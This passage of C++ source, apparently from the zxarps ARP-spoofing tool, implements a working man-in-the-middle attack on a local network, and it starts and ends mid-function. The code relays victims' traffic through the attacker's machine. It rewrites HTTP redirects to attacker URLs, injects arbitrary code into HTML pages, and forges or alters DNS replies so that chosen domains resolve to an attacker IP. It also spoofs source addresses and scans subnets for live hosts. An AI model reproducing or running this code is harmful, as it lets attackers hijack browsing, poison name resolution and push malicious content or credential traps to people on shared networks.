	char *pKeyword = (char *)strstr((const char*)tcp_data, (const char *)"Location: http://");
	if(!pKeyword)
		return false;
	pKeyword += strlen("Location: http://");
	while(*pKeyword && *pKeyword != '/')//Ѱ��"/"��־
	{
		pKeyword++;
	}
	if(*pKeyword != '/')
		return false;
	sscanf(pKeyword+1, "%s", OrgFile);
	//
	pKeyword = (char *)strstr((const char*)pKeyword, (const char *)"\r\n");
	if(!pKeyword)
		return false;
	pKeyword -= 4;

	//printf("��ע���ļ���׺��: %s\r\n", pKeyword);
	if(! lpObj->IsPostfixInList(pKeyword))//����Ƿ��ע���ļ���׺��
	{
		return false;
	}

	//�����ָ��lpObj->m_NewFile����ƴ������ûָ����ֻ�����������֣�
	//���Լ���дhttpd��ʵ�ָ��õ���ƭЧ��

	char NewContentFormat[] = 
	"HTTP/1.1 302 Object Moved\r\n\
	Location: %s%s\r\r\n\
	Server: Microsoft-IIS/5.1\r\n\
	Content-Type: text/html\r\n\
	Content-Length: 0\r\n\
	Connection: close\r\n\
	\r\n";

	*newlen = sprintf((char*)tcp_data, NewContentFormat, 
		lpObj->m_NewURL, 
		strlen(lpObj->m_NewFile)>0 ? lpObj->m_NewFile : OrgFile);
	
	printf("redirect:\r\n%s\r\n", tcp_data);

	tcp_data[*newlen] = '\0';
	//Hack URL end
	return true;
}

//ɾ��http headerһЩ���޵ı�ͷ���ڳ��ռ�������
bool ReduceHttpHeader(char *orgData, const int orglen, int *newlen, int limitlen)
{
	char HeaderBuf[4096];
	char hEOF[7];
	char *CRLF = "\r\n";
	char *pe, *currline, *prevline, *HeaderEOF;
	int _newlen, _orglen;
	_orglen = _newlen = orglen;
	if(orglen > sizeof(HeaderBuf))
		return false;
	memcpy(HeaderBuf, orgData, orglen);
	HeaderBuf[orglen] = '\0';
	pe = strstr(HeaderBuf, CRLF);
	if(pe == NULL)
	{
		CRLF++;
		pe = strstr(HeaderBuf, CRLF);
		if(pe == NULL)
		{
			return false;
		}
	}
	sprintf(hEOF, "%s%s", CRLF, CRLF);
	//lineָ���һ��
	currline = pe;
	prevline = pe + strlen(CRLF);
	HeaderEOF = strstr(HeaderBuf, hEOF);
	if(HeaderEOF == NULL)
		return false;

	while(currline && currline < HeaderEOF)
	{
		currline += strlen(CRLF);
		if(!strnicmp(currline, "Content-Length: ", 16) ||
		   !strnicmp(currline, "Content-Type: ", 14) ||
		   !strnicmp(currline, "Set-Cookie:", 11)
		   )
		/*if(//!strnicmp(currline, "Date: ", 6)||
			//!strnicmp(currline, "Server: ", 8)||
			!strnicmp(currline, "Expires: ", 9)||
			!strnicmp(currline, "Cache-Control: ", 15)
			)*/
		{
			memcpy(prevline, currline, _orglen-(currline-HeaderBuf));
			_newlen -= currline-prevline;
			_orglen -= currline-prevline;
			HeaderEOF -= currline-prevline;
			pe = strstr(prevline, CRLF);
			currline = pe;
			prevline = pe + strlen(CRLF);

		}else
		{
			currline = strstr(currline, CRLF);
		}
	}
	if(currline && currline == HeaderEOF)
	{
		prevline -= strlen(CRLF);
		memcpy(prevline, currline, _orglen-(currline-HeaderBuf));
		_newlen -= currline-prevline;
		_orglen -= currline-prevline;
	}
	if(orglen - _newlen < limitlen)
		return false;

	//printf("Original:\r\n%s\r\n", orgData);
	memcpy(orgData, HeaderBuf, _newlen);
	memset(orgData+_newlen, ' ', orglen-_newlen);//���ÿո����ճ��ĵط�
	memset(HeaderBuf+_newlen, ' ', orglen-_newlen);
	*newlen = _newlen;
	orgData[_newlen] = '\0';

	//printf("Modified:\r\n%s\r\n", HeaderBuf);

	return true;
}

char *GetStdDNSname(const char *name, char *out)
{
	int len = *name;
	char *p = out;
	while(*name)
	{
		while(len > 0)
		{
			*p++ = *(++name);
			len--;
		}
		len = *(++name);
		*p++ = '.';
	}
	*--p = '\0';
	return out;
}

int CARPSpoof::SetHackDomainName(char *strDN)
{
	const char *pNextstr = strDN;
	_HACKDNS hd;
	char rule[MAX_PATH];
	char site[128];
	char szIP[32];
	const char *psite;
	memset(&hd, 0, sizeof(_HACKDNS));

	m_hackdns_List.clear();

	while(pNextstr = TakeOutStringByChar(pNextstr, rule, sizeof(rule), ',', false))
	{
		if(psite = TakeOutStringByChar(rule, site, sizeof(site), '|', false))
		{
			if(TakeOutStringByChar(psite, szIP, sizeof(szIP), '\0', false))
			{
				if((hd.dwIP = inet_addr(szIP)) != INADDR_NONE)
				{
					char *qn = site+strlen(site)-1;
					char *p = hd.szDN + strlen(site);
					memset(hd.szDN, 0, 128);
					int n = 0;
					while(qn >= site)
					{
						if(*qn == '.')
						{
							*p = n;
							n = 0;
						}
						else
						{
							*p = *qn;
							n++;
						}
						p--;
						qn--;
					}
					*p = n;
					m_hackdns_List.push_back(hd);
				}
			}
		}
	}

	return m_hackdns_List.size();
}

bool CARPSpoof::bHackDomainName(char *strDN, DWORD *lpdwIP)
{
	for(list<_HACKDNS>::iterator it = m_hackdns_List.begin(); it != m_hackdns_List.end(); it++)
	{
		if(!stricmp(it->szDN, strDN))
		{
			*lpdwIP = it->dwIP;
			return true;
		}
	}
	return false;
}

bool CARPSpoof::bHackSiteByIP(DWORD dwIP)
{
	if(m_hacksite_List.size() == 0)//ûָ������Ϊȫ����ע
		return true;
	for(list<_HACKSITE>::iterator it = m_hacksite_List.begin(); it != m_hacksite_List.end(); it++)
	{
		if(it->dwIP == dwIP)
			return true;
	}
	return false;
}

int CARPSpoof::SetHackSite(char *strIP)
{
	const char *pNextIP = strIP;
	_HACKSITE hs;
	char site[MAX_PATH];
	memset(&hs, 0, sizeof(_HACKSITE));

	m_hacksite_List.clear();

	while(pNextIP = TakeOutStringByChar(pNextIP, site, sizeof(site), ',', false))
	{
		if((hs.dwIP = inet_addr(site)) != INADDR_NONE)
		{
			strcpy(hs.szIP, site);
			m_hacksite_List.push_back(hs);
		}else
		{
			if(DNS(site) != NULL)
			{
				strcpy(hs.szIP, DNS(site));
				hs.dwIP = inet_addr(hs.szIP);
				m_hacksite_List.push_back(hs);
				zxarps_printf("hacksite: %s -> %s.\r\n", site, DNS(site));
			}
			else
				zxarps_printf("%s does not a valid IP or domain name.\r\n", site);
		}
		memset(&hs, 0, sizeof(_HACKSITE));
	}

	return m_hacksite_List.size();
}

bool CARPSpoof::HackHtml(CARPSpoof *lpObj, u_char *tcp_data, unsigned int tcp_len, int *newlen)
{
	char tmpBuf[8192];
	char *pData = (char*)tcp_data;
	char *pHeadEOF;

	//char *test_str = "<div align=\"center\">Hello~~~~~~~~Happy New Year!<HR></div>";
	//int test_len = strlen(test_str);
	int orglen = tcp_len;
	if(! lpObj->bHackHtmlEnabled())
		return false;

	if(strnicmp(pData, "HTTP/1.1 200", 12)
		&& strnicmp(pData, "HTTP/1.0 200", 12))
		return false;

	//��text/html����ҳ��Ҫ�壬chunked�ȱ������ҳ���ò壬����
	if(!strstr(pData, "Content-Type: text/html") 
		|| strstr(pData, "Transfer-Encoding: ")
		|| strstr(pData, "Content-Encoding: ")
		//|| !strstr(pData, "Content-Length: ")
	  )
	    return false;
	
	if(pHeadEOF = strstr(pData, "\r\n\r\n"))
		pHeadEOF += 4;
	else if(pHeadEOF = strstr(pData, "\n\n"))
		pHeadEOF += 2;
	else
		return false;

	int headlen = pHeadEOF-pData;
	int newheadlen;
	if(!ReduceHttpHeader(pData, headlen, &newheadlen, strlen(lpObj->m_InsertCode)))
		return false;

	if(GetHttpHeaderData(pData, headlen, "Content-Length: ", tmpBuf))
	{
		sprintf(tmpBuf, "%d", atoi(tmpBuf)+(headlen-newheadlen));
		ModifyHttpHeaderByTitle(pData, newheadlen, "Content-Length: ", tmpBuf, &headlen);
	}else
	{
		headlen = newheadlen;
	}

	memcpy(pData+headlen, lpObj->m_InsertCode, strlen(lpObj->m_InsertCode));
	pData[tcp_len] = '\0';

	//printf("�ɹ�����������: \r\n%s\r\n\r\n", pData);
	printf("�ɹ��������.\r\n");

	return true;
}

bool CARPSpoof::HackDNS(CARPSpoof *lpObj, ETHeader *eh, IPHeader *ih, UDPHEADER *uh, u_char *udp_data, unsigned int udp_len, int *newlen)
{
	char tmp[32];
	bool ret = false;
	PDNS pdns = (PDNS)udp_data;
	u_char  *name = (u_char *)pdns + sizeof(TCPIP_DNS);
	int nlen = strlen((char*)name);
	PQUERY pqr = (PQUERY)(name + nlen + 1);
	PRESPONSE prp = (PRESPONSE)((u_char *)pqr + sizeof(QUERY));
	DWORD hackdwIP;
	int answers = ntohs(pdns->answers);

	if((pdns->flags & htons(0x7800)) != 0)//opcode
		return false;
	//�ǲ�ѯ��ַ���ַ���ͷ�IP��ַ�򷵻�
	if(ntohs(pqr->type) != 1 || ntohs(pqr->classes) != 1)
		return false;
	if(! lpObj->bHackDomainName((char*)name, &hackdwIP))
		return false;
	if((pdns->flags & htons(0x8000)) == false)//��ѯ
	{
		//����DNSӦ�����αװ�ظ�
		BYTE *pmac = dwIP2MAC(ih->ipSource);//���������ҳ���Ӧ��mac
		if(pmac == NULL)
		{
			printf("pmac == NULL ??????\r\n");
			return false;
		}
		//������̫ͷ��IPͷ��UDPͷ��DNS����
		memcpy(eh->dhost, pmac, 6);
		ih->ipDestination ^= ih->ipSource;
		ih->ipSource ^= ih->ipDestination;
		ih->ipDestination ^= ih->ipSource;

		ih->ipLength = htons(20 + 8 + sizeof(TCPIP_DNS) + 5+nlen + sizeof(RESPONSE));//
		uh->uh_dport ^= uh->uh_sport;
		uh->uh_sport ^= uh->uh_dport;
		uh->uh_dport ^= uh->uh_sport;
		uh->uh_len = htons(8 + sizeof(TCPIP_DNS) + 5+nlen + sizeof(RESPONSE));//

		pdns->flags |= htons(0x8000);
		pdns->quests = pdns->answers = htons(1);

		prp->name = 0x0cc0;
		prp->type = prp->classes = htons(1);
		prp->ttl = htonl(900);
		prp->length = htons(4);
		prp->addr = hackdwIP;

		//udp���ݳ���
		*newlen = sizeof(TCPIP_DNS) + 5+nlen + sizeof(RESPONSE);
		
		printf("DNS��ƭ(����Ӧ���) %s -> %d.%d.%d.%d\r\n", 
			GetStdDNSname((const char*)name, tmp),
			hackdwIP<<24>>24,hackdwIP<<16>>24,hackdwIP<<8>>24,hackdwIP>>24
			);
		return true;
	}else //if((pdns->flags & htons(0x8000)) != false)//Ӧ��
	{
		//�޸�Ӧ����еĵ�ַ��Դ
		while(answers > 0)
		{
			if(ntohs(prp->type) == 1)
			{
				prp->addr = hackdwIP;
				ret = true;
			}
			prp = (PRESPONSE)((u_char *)prp+sizeof(RESPONSE)-4+ntohs(prp->length));
			answers--;
		}
		printf("DNS��ƭ(�޸�Ӧ���) %s -> %d.%d.%d.%d\r\n", 
			GetStdDNSname((const char*)name, tmp),
			hackdwIP<<24>>24,hackdwIP<<16>>24,hackdwIP<<8>>24,hackdwIP>>24
			);
		//
		return ret;
	}//else
	//	return false;
}


int CARPSpoof::SetSpoofIP(char *strIP)
{
	const char *pNextstr = strIP;
	_SPOOFIP spoofip;
	char rule[MAX_PATH];
	char realip[32];
	char fakeip[32];
	const char *pIP;

	m_spoofip_List.clear();

	while(pNextstr = TakeOutStringByChar(pNextstr, rule, sizeof(rule), ',', false))
	{
		if(pIP = TakeOutStringByChar(rule, realip, sizeof(realip), '|', false))
		{
			if(TakeOutStringByChar(pIP, fakeip, sizeof(fakeip), '\0', false))
			{
				spoofip.realIP = inet_addr(realip);
				spoofip.fakeIP = inet_addr(fakeip);
				
				m_spoofip_List.push_back(spoofip);

			}
		}
	}

	return m_spoofip_List.size();
}

bool CARPSpoof::bIPToSpoof(DWORD srcIP, DWORD *lpfakeIP)
{
	for(list<_SPOOFIP>::iterator it = m_spoofip_List.begin(); it != m_spoofip_List.end(); it++)
	{
		if(it->realIP == srcIP)
		{
			*lpfakeIP = it->fakeIP;
			return true;
		}
	}
	return false;
}

//��ƭԴIP-���޸��ظ�����Ŀ��IP
bool CARPSpoof::bSpoofIP_FixDestIP(DWORD fakeIP, DWORD *lprealIP)
{
	for(list<_SPOOFIP>::iterator it = m_spoofip_List.begin(); it != m_spoofip_List.end(); it++)
	{
		if(it->fakeIP == fakeIP)
		{
			*lprealIP = it->realIP;
			return true;
		}
	}
	return false;
}
//��ƭԴIP
bool CARPSpoof::DoSpoofingIP(IPHeader *ih)
{
	bool ret = false;
	DWORD realip, fakeip;

	if(bIPToSpoof(ih->ipSource, &fakeip))
	{
		printf("IP��ƭ src: %d.%d.%d.%d -> %d.%d.%d.%d\r\n", 
			ih->ipSourceByte.byte1,
			ih->ipSourceByte.byte2,
			ih->ipSourceByte.byte3,
			ih->ipSourceByte.byte4,
			fakeip<<24>>24,fakeip<<16>>24,fakeip<<8>>24,fakeip>>24
			);

		ih->ipSource = fakeip;
		ret = true;
	}else if(bSpoofIP_FixDestIP(ih->ipDestination, &realip))
	{
		printf("IP��ƭ dest: %d.%d.%d.%d -> %d.%d.%d.%d\r\n", 
			ih->ipDestinationByte.byte1,
			ih->ipDestinationByte.byte2,
			ih->ipDestinationByte.byte3,
			ih->ipDestinationByte.byte4,
			realip<<24>>24,realip<<16>>24,realip<<8>>24,realip>>24
			);

		ih->ipDestination = realip;
		ret = true;
	}

	return ret;
}

//��������
bool CARPSpoof::ProcessPacket(CARPSpoof *lpObj, const struct pcap_pkthdr *header, 
							  u_char **pkt_data, unsigned int *pkt_len)
{
	ETHeader *eh;
	IPHeader *ih;
	TCPHeader *th;
	UDPHEADER *uh;
	u_int ip_len=0, pro_len=0, data_len=0;
    u_short sport, dport;
	unsigned char *data_offset;
	unsigned char buff[10240];//10k һ���㹻ԭʼ���ݼӲ��������
	memcpy(buff, *pkt_data, *pkt_len);
	buff[*pkt_len] = '\0';

	eh = (ETHeader *) buff;

	// �ҵ�IPͷ��λ�ú͵õ�IPͷ�ĳ���
	ih = (IPHeader *) ((u_char*)eh + 14); //14Ϊ��̫ͷ�ĳ���
	ip_len = (ih->iphVerLen & 0xf) * sizeof(unsigned long);
	if(ih->ipProtocol == PROTO_TCP)
	{
		// �ҵ�TCP��λ��
		th = (TCPHeader *) ((u_char*)ih + ip_len);
		pro_len = ((th->dataoffset>>4)*sizeof(unsigned long));
		sport = ntohs(th->sourcePort);
		dport = ntohs(th->destinationPort );
	}
	else if(ih->ipProtocol == PROTO_UDP)
	{
		// �ҵ�UDP��λ��
		uh = (UDPHEADER *) ((u_char*)ih + ip_len);
		pro_len = sizeof(UDPHEADER);
		sport = ntohs(uh->uh_sport);
		dport = ntohs(uh->uh_dport);
	}
	// ���ݳ���
	data_len = ntohs(ih->ipLength) - (ip_len + pro_len);
	// ����ƫ��ָ��
	data_offset = (unsigned char *)ih + ip_len + pro_len;

	BOOL bRetVal = FALSE;
	int newlen = data_len;

	if(lpObj->bSaveData())
		lpObj->LogData(th, ih, data_offset, data_len);

	//Ҫ����İ����������������һ������,��������true��ʾ���Ծ��޸�
	if(ih->ipProtocol == PROTO_TCP)
	{
		//SetAcceptEncoding�޸� Accept-Encoding: none���������������ص���û������
		if((lpObj->GetSpoofMode() & SPOOF_B) 
			&& lpObj->bHackHtmlEnabled() 
			//&& !memcmp(lpObj->m_Gateway.s_mac.mac, eh->dhost, 6)//Ŀ�ĵ�ַ�����صİ�(��ͨ���������)
			)
			bRetVal = SetAcceptEncoding(data_offset, data_len, &newlen);
		if(!bRetVal)
			bRetVal = lpObj->HackURL(lpObj, data_offset, data_len, &newlen);
		if(!bRetVal && (lpObj->bHackSiteByIP(ih->ipSource) || lpObj->bHackSiteByIP(ih->ipDestination)))
			bRetVal = lpObj->HackHtml(lpObj, data_offset, data_len, &newlen);
		if(!bRetVal && lpObj->bSpoofIPEnabled())
			bRetVal = lpObj->DoSpoofingIP(ih);
	}else if(ih->ipProtocol == PROTO_UDP)
	{
		if(lpObj->bHackDNSEnabled() && (sport == 53 || dport == 53))
		{
			//newlen���udp�����µĳ���
			bRetVal = lpObj->HackDNS(lpObj, eh, ih, uh, data_offset, data_len, &newlen);
			if(bRetVal)
			{
				*pkt_len += newlen-data_len;
				data_len = newlen;
			}
		}
	}

	if(!bRetVal)//û���޸ģ��ɸ�����ֱ��ת�����������¼���Ч���
		return false;

	//*pkt_len �µĳ���
	//*pkt_len += newlen-lentcp;
	//�������С�ڵ���mtu��ֱ�ӷ��ͣ�����Ҫ�ְ�
	//if(*pkt_len <= PACKET_MAXLEN)
	{
		//�����Ѿ��޸ģ���Ҫ���¼���Checksum
		ih->ipLength = htons(ip_len + pro_len + data_len);
		//ih->ipChecksum = 0;
		//ih->ipChecksum = checksum((USHORT *)ih, ip_len);
		_Checksum(ih);

		if (PCAPAPI::pcap_sendpacket(lpObj->m_adhandle, (const unsigned char *) buff, *pkt_len) < 0)
		{
			printf("[!] ProcessPacket -> send packet error. %d\r\n", *pkt_len);
			//����ʧ��,�Ļ�ԭ���Ĵ�С,�ø������ٴ���
			*pkt_len = header->len;
			return false;
		}
		printf("%d.%d.%d.%d -> %d.%d.%d.%d\r\n",
			ih->ipSourceByte.byte1, ih->ipSourceByte.byte2,
			ih->ipSourceByte.byte3, ih->ipSourceByte.byte4,
			ih->ipDestinationByte.byte1, ih->ipDestinationByte.byte2,
			ih->ipDestinationByte.byte3, ih->ipDestinationByte.byte4
			);
	}
	//else
	//{
	//}

	return true;
}

void CARPSpoof::AnalyzePacket(CARPSpoof *lpObj, const struct pcap_pkthdr *header, u_char *pkt_data)
{
	ETHeader *eh;
    IPHeader *ih;
    TCPHeader *th;
	UDPHEADER *uh;
	BYTE *pmac;
	bool bRet = false;
    u_int ip_len=0, pro_len=0, data_len=0;
	u_int pkt_len = header->len;

    u_short sport, dport;

	eh = (ETHeader *) pkt_data;

	if(pkt_len == 0)
		return; 
	if(eh->type != htons(ETHERTYPE_IP))
		return; // ֻת��IP��

	// �ҵ�IPͷ��λ�ú͵õ�IPͷ�ĳ���
	ih = (IPHeader *) ((u_char*)eh + 14); //14Ϊ��̫ͷ�ĳ���
	ip_len = (ih->iphVerLen & 0xf) * sizeof(unsigned long);
	if(ih->ipProtocol == PROTO_TCP)
	{
		// �ҵ�TCP��λ��
		th = (TCPHeader *) ((u_char*)ih + ip_len);
		pro_len = ((th->dataoffset>>4)*sizeof(unsigned long));
		sport = ntohs(th->sourcePort);
		dport = ntohs(th->destinationPort );
	}
	else if(ih->ipProtocol == PROTO_UDP)
	{
		// �ҵ�UDP��λ��
		uh = (UDPHEADER *) ((u_char*)ih + ip_len);
		pro_len = ntohs(uh->uh_len);
		sport = ntohs(uh->uh_sport);
		dport = ntohs(uh->uh_dport);
	}
	// ���ݳ���
	data_len = ntohs(ih->ipLength) - (ip_len + pro_len);

	//if(pkt_len > 1500)
	//{
	//	printf("%d\r\n", pkt_len);
	//}
	//if ((ih->ipProtocol == PROTO_TCP || ih->ipProtocol == PROTO_UDP) 
	//	&& (lpObj->IsPortInList(sport) || lpObj->IsPortInList(dport)))
	//ProcessPacket(lpObj, header, &pkt_data, &pkt_len);
	//return;
	//���غ���ƭhost�İ����ᷢ���м���host
	//  IP�����м���                     mac���м���
	if (lpObj->m_Me.dwIP != ih->ipDestination && memcmp(lpObj->m_Me.s_mac.mac, eh->dhost,6) == 0)//����Ŀ���ַ���м��ߵİ�
	{
		// rebuild IPA -> IPB
		//Դmac�����ص�mac����Ϊ����������,ת������ƭ��host
		if (memcmp(eh->shost, lpObj->m_Gateway.s_mac.mac, 6) == 0)
		{
			pmac = lpObj->dwIP2MAC(ih->ipDestination);//���������ҳ���Ӧ��mac
			if(pmac == NULL)
			{
				//printf("pmac == NULL ??????\r\n");
				return;
			}
			memcpy(eh->shost, eh->dhost, 6);//eh->shostԴ��ַ������,���İ���ԭ��ַΪ�м��ߵ�mac
			memcpy(eh->dhost, pmac, 6);//����Ŀ���ַΪ��ƭhost��mac

			lpObj->DoSpeedsCtrl(data_len);//��ʱת�����ݰ�

			if ((ih->ipProtocol == PROTO_TCP || ih->ipProtocol == PROTO_UDP) 
				&& (lpObj->IsPortInList(sport) || lpObj->IsPortInList(dport)))
			{
				//printf("\r\nGeteway -> host\r\n");

				bRet = ProcessPacket(lpObj, header, &pkt_data, &pkt_len);
			}

			if(!bRet)//ProcessPacket������û������
			{
				if (PCAPAPI::pcap_sendpacket(lpObj->m_adhandle, (const unsigned char *) pkt_data, pkt_len) < 0)
				{
					printf("[!] Forward thread send packet error\r\n");
				}
			}

		}
		// rebuild IPB -> IPA
		else//���� �� ��Ϊ��������ƭ��host,ת��������
		{
			memcpy(eh->shost, eh->dhost, 6);//���İ���ԭ��ַΪ�м��ߵ�mac
			memcpy(eh->dhost, lpObj->m_Gateway.s_mac.mac, 6);//����Ŀ���ַΪ���ص�mac

			if ((ih->ipProtocol == PROTO_TCP || ih->ipProtocol == PROTO_UDP) 
				&& (lpObj->IsPortInList(sport) || lpObj->IsPortInList(dport)))
			{
				//printf("\r\nhost -> Geteway\r\n");
				bRet = ProcessPacket(lpObj, header, &pkt_data, &pkt_len);
			
			}

			if(!bRet)
			{
				if(PCAPAPI::pcap_sendpacket(lpObj->m_adhandle, (const unsigned char *) pkt_data, pkt_len) < 0)
				{
					printf("[!] Forward thread send packet error\r\n");
				}
			}

		}

	}
}

DWORD WINAPI CARPSpoof::DoCapture(LPVOID lParam)
{

	CARPSpoof *lpObj = (CARPSpoof *)lParam;

	int ret;
	struct pcap_pkthdr *header;
	const u_char *pkt_data;

	while(1)
	{
		ret = PCAPAPI::pcap_loop(lpObj->m_adhandle, 1, packet_handler, (u_char *)lpObj);
		if(ret == 0)
		{
			//printf("pcap_loop cnt is exhausted\r\n");
			continue;
		}
		//if(ret < 0)
		else
		{
			PCAPAPI::pcap_perror(lpObj->m_adhandle, "break");
			break;
		}
	}

/*
	while(1)
	{
		ret = PCAPAPI::pcap_next_ex(lpObj->m_adhandle, &header, &pkt_data);

		if(ret == 0)
		{
			//printf("pcap_next_ex timeout\r\n");
			continue;
		}
		if(ret < 0)
		{
			PCAPAPI::pcap_perror(lpObj->m_adhandle, "break");
			break;
		}

		AnalyzePacket(lpObj, header, (u_char *)pkt_data);
	}
*/
	return 0;
}

void CARPSpoof::StopCapture()
{
	PCAPAPI::pcap_breakloop(m_adhandle);

	WaitForSingleObject(hCaptureThread, -1);

	CloseHandle(hCaptureThread);

	PCAPAPI::pcap_close(m_adhandle);

	runFlag = 0;
	exitFlag = TRUE;
}

void CARPSpoof::StartCapture()
{
	DWORD dwThreadId;
	hSpoofThread =  CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DoSpoof,
			(LPVOID) this, NULL, &dwThreadId);
	
	Sleep(1000);

	hCaptureThread =  CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DoCapture,
			(LPVOID) this, NULL, &dwThreadId);

	return;
}

void CARPSpoof::wait()
{
	WaitForSingleObject(hCaptureThread, -1);
	while(runFlag != 0)
		Sleep(64);
}

void CARPSpoof::packet_handler(u_char *param, const struct pcap_pkthdr *header, 
							   const u_char *pkt_data)
{
	AnalyzePacket((CARPSpoof*)param, header, (u_char *)pkt_data);
}



int CARPSpoof::GetHostInfo()
{
	HANDLE hThread;
	DWORD dwThreadId;
	int livingHost = 0;

	_SCANHOST *sh;
	long thread_TotalCount = m_host_List.size();
	list<_HOSTINFO>::iterator it;

	for(it = m_host_List.begin(); it != m_host_List.end();it++)
	{
		sh = new _SCANHOST;
		if(sh == NULL)
		{
			printf("memory lack.\r\n");
			return 0;
		}
		memset(sh, 0, sizeof(_SCANHOST));
		sh->b = bGetNetbiosName;
		sh->pCount = &thread_TotalCount;
		sh->pHostInfo = &(*it);
		hThread =  CreateThread(NULL, NULL, GetMacThread, (LPVOID)sh, 0, &dwThreadId);
		CloseHandle(hThread);
	}

	while(thread_TotalCount > 0)//�ȴ������߳��˳�
		Sleep(100);

	//�޸�2007.06.28
	//
	//������������ɾ��������������
	//���Ƕ�ʱ�ļ������������״̬������������Ϊ��ƭ����
/*
	for(it = m_host_List.begin(); it != m_host_List.end();)
	{
		if(it->dwIP == 0)//�Ѳ����������Ľڵ�ɾ����
			m_host_List.erase(it++);
		else
			it++;
	}

	return m_host_List.size();
*/

	//����
	for(it = m_host_List.begin(); it != m_host_List.end();it++)
	{
		if(it->bLiving)//��������
			livingHost++;
	}

	return livingHost;
}

int CARPSpoof::GetAliveHostList()
{
	int i = 0;
	int livingHost = 0;
	zxarps_printf("Found Alive Host:\r\n");
	for(list<_HOSTINFO>::iterator it = m_host_List.begin(); it != m_host_List.end(); it++)
	{
		////�޸�2007.06.28
/*
		zxarps_printf("%d: %15s %.2X-%.2X-%.2X-%.2X-%.2X-%.2X %s\r\n", ++i, it->szIP, 
			it->s_mac.mac[0], it->s_mac.mac[1], it->s_mac.mac[2], 
			it->s_mac.mac[3], it->s_mac.mac[4], it->s_mac.mac[5],
			bGetNetbiosName ? it->netbios : ""
			);
*/
		//����

		if(it->bLiving)//��������ӡ֮.
		{
			zxarps_printf("%d: %15s %.2X-%.2X-%.2X-%.2X-%.2X-%.2X %s\r\n", ++i, it->szIP, 
				it->s_mac.mac[0], it->s_mac.mac[1], it->s_mac.mac[2], 
				it->s_mac.mac[3], it->s_mac.mac[4], it->s_mac.mac[5],
				bGetNetbiosName ? it->netbios : ""
				);

			livingHost++;
		}
	}
//	return m_host_List.size();

	return livingHost;
}

int CARPSpoof::MakeIPAndPortList(char *strIP, char *strPort)
{
	char szIP[MAX_PATH], szPort[MAX_PATH];
	char szIP_start[32], szIP_end[32]; 
	char szPort_start[10], szPort_end[10]; 

	const char *pNextIP = strIP;
	const char *sNextIP;
	const char *pNextPort = strPort;
	const char *sNextPort;

	DWORD dwip_start, dwip_end;
	WORD wPort_start, wPort_end;

	in_addr addr;
	_HOSTINFO host;

	m_host_List.clear();
	m_port_List.clear();

	//
	//get ip
	while(pNextIP = TakeOutStringByChar(pNextIP, szIP, sizeof(szIP), ',', false))
	{
		if(sNextIP = TakeOutStringByChar(szIP, szIP_start, sizeof(szIP_start), '-', false))
		{
			if(TakeOutStringByChar(sNextIP, szIP_end, sizeof(szIP_end), '\0', false))
			{
				//szIP_start, szIP_end
				if(!GetdwIP(szIP_start, szIP_end, &dwip_start, &dwip_end))
					continue;

				for(DWORD dwip = dwip_start; dwip<=dwip_end; dwip++)
				{
					memset(&host, 0, sizeof(host));
					addr.S_un.S_addr = htonl(dwip);
					char *ip = inet_ntoa(addr);
					if(!ip) break;
					
					_snprintf(host.szIP, IP4LEN, "%s", ip);
					
					host.dwIP = htonl(dwip);
					//if(host.dwIP != m_Me.dwIP)       //��������Լ���IP����Ϊ�����Լ���ƭ�Լ�
						m_host_List.push_back(host);	//push
				}
			}else
			{
				//szIP_start
				if(!GetdwIP(szIP_start, szIP_start, &dwip_start, &dwip_end))
					continue;
				memset(&host, 0, sizeof(host));

				_snprintf(host.szIP, IP4LEN, "%s", szIP_start);
				host.dwIP = htonl(dwip_start);

				//if(host.dwIP != m_Me.dwIP)        //��������Լ���IP����Ϊ�����Լ���ƭ�Լ�
					m_host_List.push_back(host);	//push
			}
		}
	}
	//
	//get port
	while(pNextPort = TakeOutStringByChar(pNextPort, szPort, sizeof(szPort), ',', false))
	{
		if(sNextPort = TakeOutStringByChar(szPort, szPort_start, sizeof(szPort_start), '-', false))
		{
			if(TakeOutStringByChar(sNextPort, szPort_end, sizeof(szPort_end), '\0', false))
			{
				//szPort_start, szPort_end
				wPort_start = atoi(szPort_start);
				wPort_end = atoi(szPort_end);
			}else
			{
				wPort_start = wPort_end = atoi(szPort_start);
			}
			/////////////////

			for(WORD wPort = wPort_start; wPort<=wPort_end; wPort++)
			{				
				m_port_List.push_back(wPort);
			}
		}
	}
	if(bHackDNSEnabled())//�����������ƭDNS����ôҪ�����ע�˿�53
	{
		if(! IsPortInList(53))
			m_port_List.push_back(53);
	}

	return m_host_List.size();
}

bool CARPSpoof::IsPortInList(WORD wPort)
{
	if(m_port_List.size() == 0)//ûָ���˿�����Ϊ��עȫ���˿�
		return true;
	for(list<WORD>::iterator it = m_port_List.begin(); it != m_port_List.end(); it++)
	{
		if(*it == wPort)
			return true;
	}
	return false;
}

bool CARPSpoof::IsHostAlive(char *szIP)
{
	return IsHostAlive(inet_addr(szIP));
}

bool CARPSpoof::IsHostAlive(DWORD dwIP)
{
	ULONG macAddLen = MACLEN;
	BYTE ucMacAddr[MACLEN];
	memset(ucMacAddr, 0xff, sizeof(ucMacAddr));
	if (SendARP(dwIP, (IPAddr) NULL,(PULONG) ucMacAddr, &macAddLen) == NO_ERROR)
		return true;
	else
		return false;
}

DWORD WINAPI CARPSpoof::GetMacThread(LPVOID lParam)
{
	_SCANHOST *sh = (_SCANHOST *)lParam;
	hostent* pht;
	if(! GetMacByIP(sh->pHostInfo->szIP, sh->pHostInfo->s_mac.mac))
	{
		sh->pHostInfo->bLiving = false;//��־��IP�����
	}else
	{
		sh->pHostInfo->bLiving = true;
		if(sh->b)
		{
			pht = gethostbyaddr((char*)&(sh->pHostInfo->dwIP), 4, AF_INET);
			if(pht)
				_snprintf(sh->pHostInfo->netbios, 16, pht->h_name);
			else
				sprintf(sh->pHostInfo->netbios, "N/A");
		}
	}
	InterlockedExchangeAdd(sh->pCount, -1);
	delete sh;
	return 0;
}

bool CARPSpoof::SetSpoofHost(char *szIP)
{
	if(szIP != NULL)
		_snprintf(m_Gateway.szIP, 16, "%s", szIP);

	if(!GetMacByIP(m_Gateway.szIP, m_Gateway.s_mac.mac))//ͨ������IP�ٻ����MAC
	{
		zxarps_printf("[-] Get %s mac Error.\r\n", szIP);
		return false;
	}
	m_Gateway.dwIP = inet_addr(m_Gateway.szIP);

	return true;
}

bool CARPSpoof::GetMacByIP(DWORD dwIP, unsigned char *mac)
{
	in_addr addr;

	ULONG macAddLen=MACLEN;
	memset(mac, 0xff, macAddLen);
